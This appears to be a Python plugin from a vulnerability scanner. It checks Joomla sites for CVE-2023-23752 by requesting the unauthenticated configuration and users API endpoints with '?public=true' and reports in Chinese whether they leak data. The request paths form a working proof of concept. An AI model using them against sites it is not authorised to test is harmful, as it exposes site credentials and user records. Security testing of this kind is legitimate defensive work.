#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib3
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet
urllib3.disable_warnings()


class Cve_2023_23752_2:
    def run(self,base_url):
        try:
            url = base_url + "/api/index.php/v1/config/application?public=true"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,timeout=self.timeout)

            if req.status_code == 200 and req.url == url:
                OutPrintInfo("Joomla","[b bright_red]存在配置项信息泄漏")
                OutPrintInfo("Joomla",f"URL: {url} ")
            else:
                OutPrintInfo("Joomla", "不存在配置项信息泄漏")
        except Exception:
            OutPrintInfo("Joomla","不存在配置项信息泄漏")
    def run2(self,base_url):
        try:
            url = base_url + "/api/index.php/v1/users?public=true"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,timeout=self.timeout)
            if req.status_code == 200 and req.url == url:
                OutPrintInfo("Joomla", "[b bright_red]存在所有用户信息泄漏")
                OutPrintInfo("Joomla", f"URL: {url} ")
            else:
                OutPrintInfo("Joomla", "不存在所有用户信息泄漏")
        except Exception:
            OutPrintInfo("Joomla", "不存在所有用户信息泄漏")

    def main(self, target):
        url = target["url"].strip('/ ')
        header = target["header"]
        proxy = target["proxy"]
        self.ssl = target["ssl"]
        self.timeout = int(target["timeout"])

        self.headers, self.proxy = ReqSet(header=header, proxy=proxy)
        OutPrintInfo("Joomla", "开始检测CVE-2023-23752...")
        OutPrintInfo("Joomla", "开始检测CVE-2023-23752-POC-1配置项信息泄漏...")
        self.run(url)
        OutPrintInfo("Joomla", "开始检测CVE-2023-23752-POC-2所有用户信息泄漏...")
        self.run2(url)
        OutPrintInfo("Joomla", "CVE-2023-23752检测结束")

